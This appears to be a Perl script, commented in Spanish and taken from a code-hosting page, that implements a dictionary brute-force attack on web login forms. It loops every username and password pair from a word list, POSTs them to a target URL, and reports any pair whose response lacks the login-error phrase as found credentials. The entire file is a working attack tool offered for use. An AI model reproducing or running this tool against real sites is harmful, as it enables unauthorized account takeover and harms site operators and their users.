#!/usr/bin/perl -w

use LWP::UserAgent;
use Term::ANSIColor;
use strict;
use Getopt::Long;
use warnings;

print color('bold blue');
print '
╔══╗     ╔╗   ╔═══╗
║╔╗║    ╔╝╚╗  ║╔══╝
║╚╝╚╦═╦╗╠╗╔╬══╣╚══╦══╦═╦══╦══╗
║╔═╗║╔╣║║║║║║═╣╔══╣╔╗║╔╣╔═╣║═╣
║╚═╝║║║╚╝║╚╣║═╣║  ║╚╝║║║╚═╣║═╣
╚═══╩╝╚══╩═╩══╩╝  ╚══╩╝╚══╩══╝
 v1.0 by @unkndown
';

# definimos el nombre de los parametros a usar
my $parametros = {};
GetOptions($parametros,
  'target:s',
  'u:s',
  'p:s',
  'user:s',
  'pass:s',
  'frase:s',
  'debug:s',
  'info',
);

# si se recibe el parametro info, mostramos el mensaje de uso
$parametros->{info} && uso();

# Si no se han pasado los parametros obligatorios mostramos un mensaje de error
unless (defined $parametros->{target} && defined $parametros->{frase} && defined $parametros->{p} && defined $parametros->{u}) 
{
	print color('bold red');
	print "Falta un parametro obligatorio, usa el comando --info para mas informacion\n\n";
	exit();
}

# mostramos mensaje de informacion
sub uso {
 	print color('bold white');
	print <<"END"
Uso: perl brute.pl [parametros]
 
 --target 	: url que se atacara, con formato http://url (obligatorio)
 --u 		: nombre del input del usuario (obligatorio)
 --p 		: nombre del input de la contraseña (obligatorio)
 --frase 	: frase de error en la web, con datos incorrectos (obligatorio)
 --user 	: si sabes cual es el usuario, ingresalo aqui (opcional)
 --pass 	: si sabes cual es la contraseña, ingresala aqui (opcional)
 --debug 	: muestra el usuario, contraseña y respuesta de cada peticion (opcional)
 
END
;
	exit();
}

# url que se atacara
my $url      = $parametros->{target};

# input del nombre usuario
my $user     = $parametros->{u};

# input de la contraseña
my $pass     = $parametros->{p};

# frase que se buscara
my $frase    = $parametros->{frase};

# User agent
my $agent    = new LWP::UserAgent;

# Definimos nuestra peticion
my $peticion = new HTTP::Request 'POST',$url;

# abrimos el diccionario que contiene los datos
open (FILE,"dir.txt") || die "No se pudo abrir dir.txt, verifica que exista en la misma carpeta donde esta el script: $!";

# guardamos el contenido del diccionario
my @dir = <FILE> ;

# recorremos el contenido del diccionario
foreach(@dir) 
{	
	# definimos la variable usuario con el contenido del diccioanrio
	my $usuario = $_;;

	# eliminamos salto de linea
	chomp($usuario) ;
	
	# recorremos nuevamente el diccionario
	foreach(@dir) 
	{
		# definimos la contraseña con el contenido del diccionario
		my $password = $_ ;
		
		# eliminamos salto de linea
		chomp($password) ;
		
		# definimos headers
		$peticion->content_type('application/x-www-form-urlencoded');

		# definimos la variable que guardara nuestra respuesta
		my $cont;

		# verificamos si se pasado el parametro user
		if (!defined $parametros->{user})
		{
			# si no se paso, primero verificamos si se paso el parametro pass
			if(!defined $parametros->{pass})
			{
				# si no se paso ni el parametro user ni pass, usamos los datos del diccionario
				$cont = "&$user=$usuario&$pass=$password";
			}
			else
			{
				# de lo contrario si no se paso el parametro user, pero se paso el parametro pass
				# definiremos el user desde el diccionario
				$password = $parametros->{pass};
				$cont = "&$user=$usuario&$pass=$password";
			}
		}
		else
		{
			# si se paso el parametro user, verificamos si se paso el parametro pass
			if(!defined $parametros->{pass})
			{
				# si se paso el parametro user pero no el parametro pass
				# definiremos el pass desde el diccionario
				$usuario = $parametros->{user};
				$cont = "&$user=$usuario&$pass=$password";
			}
			else
			{
				# de lo contrario si se paso el parametro user y pass
				# detenemos el ataque ya que no es necesario realizarlo
				print color('bold red');
				print "Si tienes el user y pass, para que un brute force?\n\n";
				exit();
			}
		}
		
		# definimos el contenido de nuestra peticion
		$peticion->content($cont);

		# enviamos nuestra peticion
		my $contenido = $agent->request($peticion);
		
		#  guardamos el contenido de la respuesta de nuestra peticion como texto
		my $respuesta = $contenido->as_string;

		# verificamos si enviada la peticion se encuentra la frase de error
		if ( $respuesta !~ $frase) 
		{
			# si no se encuentra la frase, es porque los datos son correctos
			print color('bold green');
			print "---------------------------------\n";
			print " Datos encontrados:\n usuario: $usuario\n password: $password\n";			
			print "---------------------------------\n";
		}
		else
		{
			# de lo contrario si se encuentra la frase de error, es porque los datos son incorectos
			# verificamos si se ha pasado el parametro debug
			print color('bold red');
			if(defined $parametros->{debug})
			{
				# si se paso, mostramos el usuario y contraseña usado en la peticion
				# y mostramos el contenido de la respuesta
				print "Datos incorrectos --> " . colored("usuario: $usuario - pass: $password", 'white'), "\n";
				print "$respuesta\n";
			}
			else
			{
				# de lo contrario solo mostramos un mensaje de datos incorrectos
				print "Datos incorrectos\n";
			}
		}
	}
}
Status API Training Shop Blog About Pricing
